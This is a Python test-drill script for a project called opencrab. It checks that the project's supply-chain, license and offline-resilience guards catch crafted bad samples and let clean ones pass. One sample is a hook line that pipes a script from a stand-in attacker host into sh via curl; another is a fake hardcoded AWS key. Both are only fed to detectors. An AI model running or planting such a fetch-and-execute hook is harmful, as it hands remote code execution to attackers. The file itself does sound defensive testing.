#!/usr/bin/env python3
"""opencrab 供应链抗脆弱演练 🔗🌀

把三道「对外世界」的守卫串成**一场红队演练**，回答一个问题：当外部世界变坏——
依赖被投毒、引用片段漂进强 copyleft、连不上外面的爪子——我是真能认出/降级，
还是只在顺境里嘴硬？

`supplychain`/`licenseguard`/`chaos` 平时都跑在**干净的真仓库**上，绿了只证明
「此刻我没问题」，证明不了「喂我毒我也认得出」。本演练反过来**主动投毒**：拿构造
好的恶意样本喂进真正的检测函数(不是副本)，断言守卫确实亮红；再用一条明显无害的
对照样本，断言守卫不误伤。检测力和克制力,两头都验。

三条腿，各打一类「外部世界变坏」：

  · 依赖投毒腿(supplychain)：喂一段 `curl|sh` 盲信安装钩子 + 一把硬编码 AWS 凭据,
    断言 supplychain 把两者都判 high；再喂一行干净代码,断言它不误报。
  · 许可证漂移腿(licenseguard)：喂一段带 GPL 标记的「搬运片段」,断言 licenseguard
    判 BLOCK(强 copyleft 会传染整库 MIT 授权)；再喂一段自家 MIT 文件,断言它放行。
  · 断网降级腿(chaos)：crab 唯一的对外运行时依赖是「雇外部爪子(claude/codex)」。
    复用 chaos 里两个真实实验——命令起不来 / 命令卡死超时——断言它降级成
    可控、可诊断、可恢复的失败,而不是崩溃或被拖死。

全程**只喂构造样本、只在临时态里跑**,绝不改真仓库、真账本、真环境。每条腿的结论
追加进 state/ 下被 .gitignore 的流水账,供事后复盘。任何一条腿没跑通,退出码非零——
可挂钩子 / CI 当抗脆弱门禁。零第三方依赖,纯标准库。

用法:
    python supplychain_drill.py          # 跑全部三条腿,打印演练报告
    python supplychain_drill.py --json   # 导出机读报告(给 health / 外部消费)
"""
from __future__ import annotations

import argparse
import dataclasses
import json
import pathlib
import sys
import time

import supplychain
import licenseguard
import chaos
import jsonlstore

DRILL_LOG = supplychain.REPO_ROOT / "state" / "supplychain_drill.jsonl"


@dataclasses.dataclass(frozen=True)
class Leg:
    """演练一条腿的结论。"""
    name: str
    ok: bool
    detail: str

    def to_meta(self) -> dict:
        return {"leg": self.name, "ok": self.ok, "detail": self.detail}


def drill_poison() -> Leg:
    """依赖投毒腿:喂盲信安装钩子 + 硬编码凭据,断言都被判 high;干净行不误报。"""
    try:
        fake = pathlib.Path("setup_hook.py")   # 仅作报告里的定位,不落盘

        # 投毒 1:postinstall 盲信远程脚本(典型供应链投毒手法)。
        hook = 'os.system("curl http://evil.example/install.sh | sh")'
        f_hook = supplychain._scan_file_for_suspicious(fake, hook)
        hook_caught = any(f.severity == supplychain.SEV_HIGH for f in f_hook)

        # 投毒 2:被投毒的代码顺手把凭据外带(硬编码 AWS Access Key)。
        leak = 'AWS_KEY = "AKIAQ7X9ZJ4MTLVB2NWC"'
        f_leak = supplychain._scan_file_for_secrets(fake, leak)
        leak_caught = any(f.severity == supplychain.SEV_HIGH for f in f_leak)

        # 对照:一行明显无害的代码,守卫不该亮红。
        clean = "result = total / count  # 普通业务逻辑"
        no_false = (not supplychain._scan_file_for_suspicious(fake, clean)
                    and not supplychain._scan_file_for_secrets(fake, clean))

        ok = hook_caught and leak_caught and no_false
        bits = [
            f"curl|sh 钩子{'被判 high ✓' if hook_caught else '漏过 ✗'}",
            f"硬编码凭据{'被判 high ✓' if leak_caught else '漏过 ✗'}",
            f"干净行{'未误报 ✓' if no_false else '误报 ✗'}",
        ]
        return Leg("poison", ok, "；".join(bits))
    except Exception as e:   # noqa: BLE001
        return Leg("poison", False, f"{type(e).__name__}: {e}")


def drill_license_drift() -> Leg:
    """许可证漂移腿:喂带 GPL 标记的搬运片段,断言判 BLOCK;自家 MIT 文件放行。"""
    try:
        snippet = pathlib.Path("vendored_helper.py")   # 落在引用片段面(非生成目录)

        # 漂移:进化时原样搬进一段 GPL 代码——强 copyleft,混入即传染整库 MIT 授权。
        gpl = ("# SPDX-License-Identifier: GPL-3.0-or-later\n"
               "# Copyright (c) 2021 Some Upstream Author\n"
               "# Licensed under the GNU General Public License v3.\n"
               "def borrowed(): ...\n")
        f_gpl = licenseguard._scan_text(snippet, gpl)
        gpl_blocked = any(f.verdict == licenseguard.VERDICT_BLOCK for f in f_gpl)

        # 对照:一段自家 MIT 头的文件,守卫不该判 BLOCK(宽松、同源,放行)。
        mit = ("# SPDX-License-Identifier: MIT\n"
               "# Copyright (c) 2026 opencrab\n"
               "def native(): ...\n")
        mit_ok = not any(f.verdict == licenseguard.VERDICT_BLOCK
                         for f in licenseguard._scan_text(snippet, mit))

        ok = gpl_blocked and mit_ok
        bits = [
            f"GPL 片段{'被判 BLOCK ✓' if gpl_blocked else '漏过 ✗'}",
            f"自家 MIT 文件{'放行 ✓' if mit_ok else '误判 ✗'}",
        ]
        return Leg("license", ok, "；".join(bits))
    except Exception as e:   # noqa: BLE001
        return Leg("license", False, f"{type(e).__name__}: {e}")


def drill_offline() -> Leg:
    """断网降级腿:外部爪子起不来 / 卡死时,断言降级成可控可诊断可恢复的失败。"""
    try:
        # crab 的对外运行时依赖 = 雇外部命令(claude/codex)。断网/不可达,等价于
        # 「命令起不来」或「命令卡死」——复用 chaos 里打在真实 evidence 层上的两个实验。
        missing = chaos._experiment_command_missing()
        timeout = chaos._experiment_command_timeout()
        ok = missing.passed and timeout.passed
        bits = [
            f"爪子起不来:{missing.facets()}",
            f"爪子卡死超时:{timeout.facets()}",
        ]
        return Leg("offline", ok, "；".join(bits))
    except Exception as e:   # noqa: BLE001
        return Leg("offline", False, f"{type(e).__name__}: {e}")


def run() -> list[Leg]:
    return [drill_poison(), drill_license_drift(), drill_offline()]


def _record(legs: list[Leg]) -> None:
    """把整场演练的结论追加进流水账(写盘失败被吞,绝不反噬生命)。"""
    try:
        jsonlstore.append_jsonl(DRILL_LOG, {
            "ts": time.strftime("%Y-%m-%dT%H:%M:%S"),
            "event": "supplychain_drill",
            "ok": all(l.ok for l in legs),
            "legs": [l.to_meta() for l in legs],
        })
    except Exception:
        pass


def _print(legs: list[Leg]) -> None:
    print("🔗🌀 opencrab 供应链抗脆弱演练\n")
    for l in legs:
        print(f"  {'✅' if l.ok else '❌'} {l.name}：{l.detail}")
    print()
    if all(l.ok for l in legs):
        print("🔗 守约：投毒认得出、漂移挡得住、断网降得了——外部世界变坏,我仍稳健。")
    else:
        print("⚠️  抗脆弱演练有腿没跑通,守卫的检测力可能退化——先修好再大胆对外蜕壳。")


def main(argv: list[str] | None = None) -> None:
    ap = argparse.ArgumentParser(description="opencrab 供应链抗脆弱演练 🔗🌀")
    ap.add_argument("--json", action="store_true", help="导出机读演练报告")
    args = ap.parse_args(argv)

    legs = run()
    _record(legs)
    if args.json:
        print(json.dumps({"ok": all(l.ok for l in legs),
                          "legs": [l.to_meta() for l in legs]},
                         ensure_ascii=False, indent=2))
    else:
        _print(legs)
    sys.exit(0 if all(l.ok for l in legs) else 1)


if __name__ == "__main__":
    main()
